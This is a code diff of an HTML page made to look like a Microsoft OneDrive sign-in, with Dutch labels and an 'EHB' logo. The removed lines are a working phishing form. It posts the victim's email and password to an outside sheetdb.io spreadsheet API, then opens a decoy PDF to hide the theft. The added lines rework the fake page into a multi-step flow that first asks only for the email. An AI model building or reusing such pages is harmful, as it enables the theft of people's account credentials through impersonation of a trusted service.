@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft-style Sign Up</title>
+    <title>Microsoft-style Sign Up - Page 1</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -23,7 +23,7 @@
             background-color: #fff;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 4px;
-            text-align: center;
+            text-align: left; /* Align text to the left */
             position: relative;
         }
 
@@ -92,41 +92,26 @@
     </style>
 </head>
 <body>
-    <form action="https://sheetdb.io/api/v1/in809r7hsx8hy" method="post" id="sheetdb-form">
+    <form action="page2.html" method="get">
         <img class="logo" src="logo-EHB.png" alt="Logo">
         <div class="container">
-            <h1></h1>
+            <br>
+            <h1>Aanmelden</h1>
             <br>
 
-            <p>Meld je aan bij OneDrive</p>
+            <p></p>
 
-            <label for="email"><b>Email</b></label>
-            <input type="text" placeholder="Enter Email" name="data [email]" required>
-
-            <label for="psw"><b>Password</b></label>
-            <input type="password" placeholder="Enter Password" name="data [psw]" required>
+            <label for="email"><b></b></label>
+            <input type="text" placeholder="Enter Email" name="email" required>
 
             <div class="clearfix">
+                <br>
+                            <br>
             <br>
-            <br>
+
                 <button type="submit" class="signupbtn">Volgende</button>
             </div>
         </div>
     </form>
-    <script>
-        var form = document.getElementById('sheetdb-form');
-        form.addEventListener("submit", e => {
-            e.preventDefault();
-            fetch(form.action, {
-                method: "POST",
-                body: new FormData(document.getElementById("sheetdb-form")),
-            }).then(
-                response => response.json()
-            ).then(() => {
-                // you can put any JS code here
-                window.open('Fluo III.pdf', '_blank');
-            });
-        });
-    </script>
 </body>
 </html>
